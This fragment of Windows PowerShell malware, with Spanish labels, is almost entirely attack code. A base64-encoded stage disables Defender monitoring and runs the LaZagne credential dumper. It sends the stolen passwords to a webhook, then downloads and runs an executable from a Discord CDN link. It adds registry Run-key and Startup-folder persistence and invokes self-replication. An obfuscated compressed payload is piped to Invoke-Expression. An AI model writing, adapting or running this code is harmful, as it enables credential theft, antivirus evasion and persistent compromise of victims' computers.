JHEkayRpJGIkbSRpJGgkaSRqJGYkaSRmJGIkbCRuJHIkayRoJG4kaiRsJGIiDQokaHVtYW4gPSAiJHZlcm0kYiRwJGokbyRqJHEkayRpJGV4Ig0KJHplbGRhID0gIiRkZW1vbiRhbmdlbCRodW1hbiIgfCBPdXQtU3RyaW5nDQpXcml0ZS1Ib3N0ICR6ZWxkYQ0KaWYgKCRBZG1pbiAtZXEgJ1RydWUnKSB7DQogIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUNCg0KICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICIkZGlyIg0KfQ0KJGhpZGUgPSBHZXQtSXRlbSAiJGRpciIgLUZvcmNlDQokaGlkZS5hdHRyaWJ1dGVzPSdIaWRkZW4nDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICIkemVsZGEiIC1PdXRGaWxlICIkZGlyXGxhemFnbmUuZXhlIg0KJiAiJGRpclxsYXphZ25lLmV4ZSIgYWxsID4gIiRsb2ciDQpjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpDb21wdXRlck5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIk5ldyBGaWxlIFVwbG9hZGVkYCFcbihBZG1pbjogJEFkbWluKSBcYCJ9IiAtRiAiZmlsZT1AXGAiJGxvZ1xgIiIgJHdlYmhvb2sgPiRudWxsIDI+JjENClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIwDQppZiAoJEFkbWluIC1lcSAnVHJ1ZScpew0KICBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICRmYWxzZQ0KDQogIFJlbW92ZS1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggIiRkaXIiDQp9DQokdW5oaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KJHVuaGlkZS5hdHRyaWJ1dGVzPSdOb3JtYWwnDQpSZW1vdmUtSXRlbSAtUGF0aCAiJGRpciIgLVJlY3Vyc2UgLUZvcmNl > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1";

Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269444822612181054/distopan.exe?ex=66b0161e&is=66aec49e&hm=1e4d002fc89f532ae6b53f298bcacf892700f1e8137fa1f43cafcab59bdd8591&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";

function Add-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
    $name = "DistopiaPersistence";
    $value = "$env:TEMP\distopi.exe";
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null;
    }
    Set-ItemProperty -Path $regPath -Name $name -Value $value;
}

function Add-StartupFolderPersistence {
    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\distopi.lnk");
    $shell = New-Object -ComObject WScript.Shell;
    $shortcut = $shell.CreateShortcut($startupPath);
    $shortcut.TargetPath = "$env:TEMP\distopi.exe";
    $shortcut.Save();
}

Add-RegistryPersistence;
Add-StartupFolderPersistence;

Invoke-SelfReplication;

Invoke-SelfDestruction;


exit;

'@




Cadena Base64 Comprimida: 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
Código PowerShell para descomprimir y decodificar:
(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( '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') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( ,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION

